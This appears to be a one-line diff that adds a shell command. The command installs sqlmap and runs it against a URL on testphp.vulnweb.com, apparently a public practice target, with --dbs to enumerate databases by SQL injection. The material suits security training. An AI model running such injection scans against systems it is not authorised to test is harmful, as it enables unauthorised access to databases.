@@ -1,0 +1,1 @@
+pip install sqlmap &&  export PATH=$PATH:/snap/sqlmap/36/lib/python3.6/site-packages/sqlmap && sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs
